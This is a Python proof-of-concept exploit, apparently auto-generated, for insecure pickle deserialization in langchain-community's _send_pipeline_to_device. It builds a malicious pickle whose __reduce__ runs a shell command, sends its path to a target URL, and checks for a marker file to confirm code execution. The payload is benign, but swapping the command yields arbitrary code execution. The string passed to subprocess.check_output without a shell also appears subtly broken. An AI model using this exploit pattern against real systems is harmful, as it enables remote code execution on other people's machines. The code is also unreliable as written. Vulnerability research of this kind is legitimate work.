#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_who_control_pipeline__send_pipeline_to_device_7.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure deserialization in langchain-community-only.

Vulnerability: The function _send_pipeline_to_device in self_hosted.py accepts a
'pipeline' parameter. If it is a string, it opens the file and deserializes it
with pickle.load. An attacker who can control the 'pipeline' parameter can
achieve arbitrary code execution by providing a malicious pickle payload.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Triggering the vulnerable function with the path to this file
3. Verifying the command was executed

Usage: python poc.py [--target http://localhost:8000]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
import requests

# Benign payload - creates a marker file to prove code execution
BENIGN_COMMAND = "touch /tmp/poc_success.txt"

class MaliciousPickle:
    """Class that executes a command when unpickled."""
    def __reduce__(self):
        return (subprocess.check_output, (BENIGN_COMMAND,))

def create_malicious_pickle(filepath: str) -> None:
    """Create a malicious pickle file that executes our command."""
    payload = MaliciousPickle()
    with open(filepath, 'wb') as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file at: {filepath}")

def trigger_vulnerability(target_url: str, pickle_path: str) -> None:
    """
    Trigger the vulnerable function by sending a request with the pickle file path.
    
    The simulated endpoint calls _send_pipeline_to_device with user-controlled input.
    """
    # The vulnerable function expects a string (file path) as the pipeline parameter
    # In a real scenario, this would be passed via API parameters
    payload = {"pipeline": pickle_path}
    
    try:
        print(f"[*] Sending request to {target_url} with pickle path: {pickle_path}")
        response = requests.post(
            target_url,
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}")
    except requests.exceptions.ConnectionError:
        print("[!] Connection failed - is the target server running?")
        print("[!] This PoC requires a server that calls _send_pipeline_to_device")
        print("[!] with user-controlled input.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

def verify_exploitation() -> bool:
    """Check if the benign command was executed successfully."""
    marker_file = "/tmp/poc_success.txt"
    time.sleep(1)  # Give the command time to execute
    
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS! Marker file created: {marker_file}")
        print("[+] Code execution achieved via pickle deserialization!")
        # Clean up
        os.remove(marker_file)
        return True
    else:
        print("[-] Marker file not found - exploitation may have failed")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000/api/v1/trigger",
        help="Target URL that calls _send_pipeline_to_device (default: http://localhost:8000/api/v1/trigger)"
    )
    args = parser.parse_args()
    
    print("[*] langchain-community pickle deserialization RCE PoC")
    print("[*] Target:", args.target)
    print()
    
    # Create temporary pickle file
    with tempfile.NamedTemporaryFile(suffix='.pkl', delete=False) as tmp:
        pickle_path = tmp.name
    
    try:
        # Step 1: Create malicious pickle
        create_malicious_pickle(pickle_path)
        
        # Step 2: Trigger the vulnerability
        trigger_vulnerability(args.target, pickle_path)
        
        # Step 3: Verify exploitation
        verify_exploitation()
        
    finally:
        # Clean up pickle file
        if os.path.exists(pickle_path):
            os.remove(pickle_path)
            print(f"[*] Cleaned up pickle file: {pickle_path}")

if __name__ == "__main__":
    main()
